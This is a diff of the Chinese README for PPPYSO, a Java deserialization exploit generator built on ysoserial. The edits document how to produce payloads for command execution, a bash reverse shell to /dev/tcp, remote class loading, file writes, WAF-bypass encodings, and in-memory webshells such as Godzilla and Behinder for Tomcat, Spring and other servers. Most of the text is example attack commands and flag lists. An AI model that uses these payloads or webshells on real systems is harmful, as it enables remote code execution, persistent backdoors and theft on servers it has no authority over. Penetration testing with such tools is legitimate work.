@@ -17,17 +17,23 @@ chain 概念，将 [ysoserial](https://github.com/frohoff/ysoserial) 原先的�
 
 - [x] `InvokerTransformer` 功能增强
 - [x] `TemplatesImpl` JavaClass增强、AbstractTranslet 可选移除、_bytecodes 特征消除
+- [x] rome、rometools 兼容
+- [x] 修改 serialVersionUID 兼容多版本，eg. Cb 支持 [1.8.3 | 1.6 | 1.5]
 - [x] 二次反序列化增强
-- [x] rome、rometools
-- [x] CB serialVersionUID 兼容
+- [x] JavaClass 信息消除：随机类名、移除源文件信息、移除源文件信息等可能暴露来源的信息。
+- [x] JDK6 兼容输出
 
 ### JavaClass 模块
 
 基于子项目 [JavaRce](https://github.com/Whoopsunix/JavaRce) ，在实现上不同。PPPYSO 中通过动态代理的方式实现内存马，减少依赖的同时兼容
 javax/jakarta 标准。JavaClass 动态类名、内存马、Rce 回显。
 
-- [x] Loader + Proxy，积极测试兼容中
+- [x] Loader + Proxy 积极测试兼容中
 - [x] 兼容 javax/jakarta 标准
+- [x] 结果增强输出，eg. SPEL+FreeMarker
+  - [x] 高版本 JDK 下 SPEL 注入
+- [x] 功能增强积极增加中 Exec、Godzilla、Behinder、Sou5
+- [x] Unsafe 实现高版本 JDK 字节码加载兼容
 
 ### common 模板
 
@@ -35,7 +41,7 @@ javax/jakarta 标准。JavaClass 动态类名、内存马、Rce 回显。
 
 - [x] 序列化：原生、XStream、HexAscii
 - [x] WAF 绕过：UTF8Mix 2 3 字节加密
-- [x] 结果保存形式：文件、Base64、GZIP
+- [x] 支持组合结果输出：文件、Base64、GZIP，eg. gzip,base64 
 
 ### 交互
 
@@ -81,8 +87,9 @@ URLDNS 支持组件利用链探测和类探测
 
 ## 组件探测
 
-`-dp` 指定组件，`all` 探测所有，组件探测参考 [Urldns](https://github.com/kezibei/Urldns)
-项目的实现，改了一些类可以通过 `-dp show` 展示目前规则已写的类
+组件探测参考 [Urldns ](https://github.com/kezibei/Urldns)项目实现，改了一些类可以通过 `-dp show` 展示目前规则已写的类
+
++ `-dp` 指定组件，`all` 探测所有
 
 ![image-20240423142525765](attachments/image-20240423142525765.png)
 
@@ -94,7 +101,11 @@ eg. `-g URLDNS -host 7ox24q.dnslog.cn -dp "all"`
 
 ## 类探测
 
-`-cn` 指定探测的全限定类名，`-ds` 指定对应的子域名
++ `-cn` 指定探测的全限定类名
++ `-ds` 指定对应的子域名
+
+
+
 eg. `-g URLDNS -host 4hu16z.dnslog.cn -cn "com.ppp.DNSTest" -ds "pppyso"`
 
 ![image-20240423115614913](attachments/image-20240423115614913.png)
@@ -114,28 +125,34 @@ eg. `-g URLDNS -host 4hu16z.dnslog.cn -cn "com.ppp.DNSTest" -ds "pppyso"`
 ```
 -e command
 -cmd {whoami}
--cmdt {Runtime(Default)|ScriptEngine}
+-cmdt {ScriptEngine}
 -split
 ```
 
-通过 `-split` 参数会将命令拆分为 `String[3]` 数组，用这个参数相当于可以指定执行命令所需的终端
++ `-cmd` 输入命令
++ `-cmdt` 命令执行类型
++ `-split` 参数会将命令拆分为 `String[3]` 数组，用这个参数相当于可以指定执行命令所需的终端
 
 eg. `-g commonscollections1 -e command -cmd "bash -c bash -i >&/dev/tcp/ip/1234 0>&1" -split`
 
 ![image-20240419091148438](attachments/image-20240419091148438.png)
 
-通过 `-cmdt` 参数指定命令执行类型
+### ScriptEngine
+
+通过 `-cmdt` 参数指定命令执行类型为 `ScriptEngine` 
 
 eg. `-g commonscollections2 -e command -cmd "open -a Calculator.app" -cmdt ScriptEngine`
 
 ![image-20240419101743213](attachments/image-20240419101743213.png)
 
-code 也是支持自定义的
++ `-code` 支持自定义 js 语句
+
 eg. `-g commonscollections2 -e command -cmdt ScriptEngine -code "x=new java.lang.ProcessBuilder;x.command('open','-a','Calculator.app');x.start();"`
 
 ![image-20240419104955526](attachments/image-20240419104955526.png)
 
-`InvokerTransformer` 增强的链支持使用 `-cf` 从文件中获取复杂语句
++ `-cf` 对于`InvokerTransformer` 增强的链支持从文件中获取复杂语句
+
 eg. `-g commonscollections2 -e command -cmdt ScriptEngine -cf code.txt`
 
 ![image-20240419110149928](attachments/image-20240419110149928.png)
@@ -147,7 +164,7 @@ eg. `-g commonscollections2 -e command -cmdt ScriptEngine -cf code.txt`
 -dt {/s}
 ```
 
-通过 `-dt` 指定延时时间 /s
++ `-dt` 指定延时时间 /s
 
 eg. `-g commonscollections2 -e delay -dt 5`
 
@@ -160,7 +177,7 @@ eg. `-g commonscollections2 -e delay -dt 5`
 -host {ip:port}
 ```
 
-通过 `-host` 指定需要发起 socket 请求的地址，用来测试是调用链被 ban 了还是限制了执行命令。
++ `-host` 指定需要发起 socket 请求的地址，用来测试是调用链被 ban 了还是限制了执行命令。
 
 eg. `-g commonscollections2 -e socket -host 127.0.0.1:1234`
 
@@ -175,13 +192,14 @@ eg. `-g commonscollections2 -e socket -host 127.0.0.1:1234`
 -ctor
 ```
 
-通过 `-url` 指定远程地址，`-cn` 指定远程加载的类名
++ `-url` 指定远程地址
++ `-cn` 指定远程加载的类名
 
 eg. `-g commonscollections2 -e RemoteLoad -url http://127.0.0.1:1234/ClassLoad-1.0.jar -cn org.example.Exec`
 
 ![image-20240423103555978](attachments/image-20240423103555978.png)
 
-eg. 如何远程加载的类构造方法需要参数，可以通过 `-ctor` 指定，支持 `Int | String` 类型
++ `-ctor` 指定需要参数的构造方法，支持 `Int | String` 类型
 
 ![image-20240423103622803](attachments/image-20240423103622803.png)
 
@@ -197,7 +215,10 @@ eg. 如何远程加载的类构造方法需要参数，可以通过 `-ctor` 指�
 -part
 ```
 
-通过 `-sfp` 指定写入远程文件的地址，`-fc` 指定需要写入的内容，或者通过 `-lfp` 从本地读取文件，`-append` 追加写入文件。
++ `-sfp` 指定写入远程文件的地址
++ `-fc` 指定需要写入的内容
++ `-lfp` 从本地读取文件
++ `-append` 追加写入文件
 
 eg. `-g commonscollections1 -e FileWrite -sfp /tmp/1.jsp -fc 123456`
 
@@ -218,7 +239,7 @@ eg. `-g commonscollections1 -e FileWrite -sfp /tmp/itest -lfp /tmp/iox -split -p
 
 ## 继承 AbstractTranslet
 
-通过 `-ext` 参数指定 `TemplatesImpl` 增强的类继承 AbstractTranslet
++ `-ext` 参数指定 `TemplatesImpl` 增强的类继承 AbstractTranslet
 
 ![image-20240421232031498](attachments/image-20240421232031498.png)
 
@@ -230,7 +251,7 @@ eg. `-g commonscollections1 -e FileWrite -sfp /tmp/itest -lfp /tmp/iox -split -p
 -jfp {filePath}
 ```
 
-可以选择加载自定义的 JavaClass，.class 文件或者形如 `yv66vg` 开头的 base64 加密
++ `-jht Custom -jfp ` 可以选择加载自定义的 JavaClass，.class 文件或者形如 `yv66vg` 开头的 base64 加密
 
 eg. `-g Fastjson -e JavaClass -jht Custom -jfp testms`
 
@@ -245,8 +266,9 @@ eg. `-g Fastjson -e JavaClass -jht Custom -jfp testms`
 | Resin  | [4.0.52, 4.0.66] |                              |
 | Jetty  |                  |                              |
 
-通过 `-jht` 参数指定为 Rce 回显，`-mw` 参数指定中间件，`-jt` 指定回显的实现方式，可通过 `AutoFind` 使用线程遍历寻找 request
-（正在针对实际环境优化中..)
++ `-e JavaClass -jht RceEcho` 指定为 Rce 回显
++ `-mw` 参数指定中间件
++ `-jt` 指定回显的实现方式，可通过 `AutoFind` 使用线程遍历寻找 request（实测优化中..)
 
 可选参数默认都是随机生成的，也可以指定
 
@@ -277,7 +299,8 @@ eg. `-g commonscollections2 -e JavaClass -jht RceEcho -mw Tomcat -o base64`
 -mw [Tomcat | Jetty ...]
 -ms [Servlet | Listener | Filter ...]
 -msf [Exec | Godzilla ...]
--jt [AutoFind | Default]
+-jt [AutoFind]
+-mt [Raw]
 
 -fname
 -fheader
@@ -289,8 +312,12 @@ eg. `-g commonscollections2 -e JavaClass -jht RceEcho -mw Tomcat -o base64`
 -flv
 ```
 
-通过 `-jht` 参数指定为内存马，`-mw` 参数指定中间件，`-ms` 指定内存马类型，`-msf` 指定内存马功能，`-jt`
-指定内存马上下文的获取方式，目前计划实现自动线程遍历寻找 request，可通过 `AutoFind` 触发
++ `-e JavaClass -jht MemShell` 指定为内存马
++ `-mw` 指定中间件
++ `-ms` 指定内存马类型
++ `-msf` 指定内存马功能
++ `-jt` 指定内存马上下文的获取方式，目前计划实现自动线程遍历寻找 request，可通过 `AutoFind` 触发
++ `-mt` 指定内存马实现方式，目前只适配了 Spring Interceptor Godzilla Raw
 
 可选参数默认都是随机生成的，也可以指定
 
@@ -302,22 +329,22 @@ eg. `-g commonscollections2 -e JavaClass -jht RceEcho -mw Tomcat -o base64`
 - `-fpass` 指定内存马密码
 - `-flk` 、`-flv` 指定触发内存马需要的 K-V 值，Contains 关系，比如 User-Agent 中需要存在 `Whoopsunix`。
 
-|                    | remarks                        | Exec | Godzilla | Behinder | Suo5(todo jakarta) | Version Test                        | Auto Version Test (正在针对实际环境优化中..) |
-|--------------------|--------------------------------|------|----------|----------|--------------------|-------------------------------------|-----------------------------------|
-| Tomcat Servlet     |                                | ✔    | ✔        | ✔        | ✔                  | 7-11                                |                                   |
-| Tomcat Filter      |                                | ✔    | ✔        | ✔        | ✔                  | 7-11                                |                                   |
-| Tomcat Listener    |                                | ✔    | ✔        | ✔        | ✔                  | 6.0.35, [7.0.59, 7.0.109], 8, 9, 10 | 5-11                              |
-| Tomcat Executor    | 通过 Header 交互, Thread Auto Find | ✔    |          |          |                    | 8, 9                                |                                   |
-| Tomcat Valve       | 动态代理没有经过实际环境测试                 | ✔    | ✔        | ✔        |                    | 8                                   |                                   |
-| Resin Servlet      |                                | ✔    | ✔        | ✔        | ✔                  | [4.0.52, 4.0.66]                    |                                   |
-| Resin Filter       |                                | ✔    | ✔        | ✔        | ✔                  | [4.0.52, 4.0.66]                    |                                   |
-| Resin Listener     |                                | ✔    | ✔        | ✔        | ✔                  | [4.0.52, 4.0.66]                    |                                   |
-| Jetty Listener     |                                | ✔    | ✔        | ✔        | ✔                  | 9, 10                               | 7-11                              |
-| Undertow Servlet   |                                | ✔    | ✔        | ✔        | ✔                  | 2.2.25.Final                        |                                   |
-| Undertow Listener  |                                | ✔    | ✔        | ✔        | ✔                  | 2.2.25.Final                        |                                   |
-| Undertow Filter    |                                | ✔    | ✔        | ✔        | ✔                  | 2.2.25.Final                        |                                   |
-| Spring Controller  |                                | ✔    |          |          |                    | 5.3.28                              |                                   |
-| Spring Interceptor |                                | ✔    | ✔        |          |                    | 5.3.28                              |                                   |
+|                    | remarks                            | Exec | Godzilla | Behinder | Suo5(todo jakarta) | Version Test                        | Auto Version Test |
+| ------------------ | ---------------------------------- | ---- | -------- | -------- | ------------------ | ----------------------------------- | ----------------- |
+| Tomcat Servlet     |                                    | ✔    | ✔        | ✔        | ✔                  | 7-11                                |                   |
+| Tomcat Filter      |                                    | ✔    | ✔        | ✔        | ✔                  | 7-11                                |                   |
+| Tomcat Listener    |                                    | ✔    | ✔        | ✔        | ✔                  | 6.0.35, [7.0.59, 7.0.109], 8, 9, 10 | 5-11              |
+| Tomcat Executor    | 通过 Header 交互, Thread Auto Find | ✔    |          |          |                    | 8, 9                                |                   |
+| Tomcat Valve       | 动态代理没有经过实战测试           | ✔    | ✔        | ✔        |                    | 8                                   |                   |
+| Resin Servlet      |                                    | ✔    | ✔        | ✔        | ✔                  | [4.0.52, 4.0.66]                    |                   |
+| Resin Filter       |                                    | ✔    | ✔        | ✔        | ✔                  | [4.0.52, 4.0.66]                    |                   |
+| Resin Listener     |                                    | ✔    | ✔        | ✔        | ✔                  | [4.0.52, 4.0.66]                    |                   |
+| Jetty Listener     |                                    | ✔    | ✔        | ✔        | ✔                  | 9, 10                               | 7-11              |
+| Undertow Servlet   |                                    | ✔    | ✔        | ✔        | ✔                  | 2.2.25.Final                        |                   |
+| Undertow Listener  |                                    | ✔    | ✔        | ✔        | ✔                  | 2.2.25.Final                        |                   |
+| Undertow Filter    |                                    | ✔    | ✔        | ✔        | ✔                  | 2.2.25.Final                        |                   |
+| Spring Controller  |                                    | ✔    |          |          |                    | 5.3.28                              |                   |
+| Spring Interceptor |                                    | ✔    | ✔ Raw    |          |                    | 5.3.28                              |                   |
 
 eg. `-g commonscollections2 -e JavaClass -jht MemShell -mw Tomcat -ms Listener -msf Exec -o base64`
 
@@ -336,13 +363,25 @@ eg. `-g commonscollections1 -e JavaClass -jht MemShell -mw Tomcat -ms Listener -
 
 ## JavaClass 封装
 
-JavaClass 单独生成eg. `-e JavaClass -jht MemShell -mw Tomcat -ms Listener -msf Exec -je FreeMarker`
+JavaClass 也可以单独生成，并且提供加密封装
 
-![image-20240424163247305](attachments/image-20240424163247305.png)
+```
+-je [Script ｜ SPEL | FreeMarker]
+-jme [JDK17]
+```
 
-![image-20240425092638935](attachments/image-20240425092638935.png)
++ `-je` 指定封装方式，支持组合封装 eg. `SPEL,FreeMarker`
++ `-jme` JavaClass 创建增强逻辑，之后考虑是否太麻烦了移除，目前有 SPEL JDK17 封装
+
+eg. `-e JavaClass -jht MemShell -mw Tomcat -ms Listener -msf Exec -je FreeMarker`
+
+某 FreeMarker 高版本 JDK 环境利用 `-e JavaClass -jht MemShell -mw Spring -ms Interceptor -msf Godzilla -je SPEL,FreeMarker -jme JDK17 -mt raw`
+
+![image-20240504120717253](attachments/image-20240504120717253.png)
 
 # 0x04 Common 模块
+
+## 输出
 
 ```
 -o [Default | GZIP | Base64]
@@ -351,15 +390,15 @@ JavaClass 单独生成eg. `-e JavaClass -jht MemShell -mw Tomcat -ms Listener -m
 -close
 ```
 
-`-save` 指定结果输出到哪个文件
-
-`-close` 关闭除结果外的其他输出
-
-`-o` 指定输出方式，支持按顺序组合输出，eg. `-g commonscollections1 -cmd "open -a Calculator.app" -o gzip,base64`
++ `-save` 指定结果输出到哪个文件
++ `-close` 关闭除结果外的其他输出
++ `-o` 指定输出方式，支持按顺序组合输出，eg. `-g commonscollections1 -cmd "open -a Calculator.app" -o gzip,base64`
 
 ![image-20240423093150806](attachments/image-20240423093150806.png)
 
-`-st` 指定序列化输出类型，eg. `-g commonscollections1 -cmd "open -a Calculator.app" -st UTF8Mix`
+## 序列化类型
+
++ `-st` 指定序列化输出类型，eg. `-g commonscollections1 -cmd "open -a Calculator.app" -st UTF8Mix`
 
 ![image-20240423093210772](attachments/image-20240423093210772.png)
 
@@ -369,7 +408,7 @@ JavaClass 单独生成eg. `-e JavaClass -jht MemShell -mw Tomcat -ms Listener -m
 
 ## CB serialVersionUID 冲突
 
-通过 `-cb` 参数指定，可选 `[1.8.3 | 1.6 | 1.5]`，默认 >- 1.9.0 的 serialVersionUID
+暂时兼容CB，通过 `-cb` 参数指定，可选 `[1.8.3 | 1.6 | 1.5]`，默认 > 1.9.0 的 serialVersionUID
 
 eg. `-g CommonsBeanutils1 -cmd "open -a Calculator.app" -cb 1.8.3`
 
@@ -384,7 +423,7 @@ eg. `-g CommonsBeanutils1 -cmd "open -a Calculator.app" -cb 1.8.3`
 
 ## 二次反序列化
 
-`-wrap` 指令进行 SignedObject 二次反序列化封装，主要还是出现在 CTF 题，所以只在 ROME 链打了个样
++ `-wrap` 指令进行 SignedObject 二次反序列化封装，主要还是出现在 CTF 题，所以只在 ROME 链打了个样
 
 eg. `-g ROME -cmd "open -a Calculator.app" -wrap`
 
@@ -396,7 +435,7 @@ eg. `-g ROME -cmd "open -a Calculator.app" -wrap`
 -gd [rome | rometools]
 ```
 
-通过 -gd 指定 rome 的依赖包 eg. `-g ROME -cmd "open -a Calculator.app" -gd rometools`
++ `-gd` 指定 rome 的依赖包 eg. `-g ROME -cmd "open -a Calculator.app" -gd rometools`
 
 ![image-20240427155050391](attachments/image-20240427155050391.png)
 
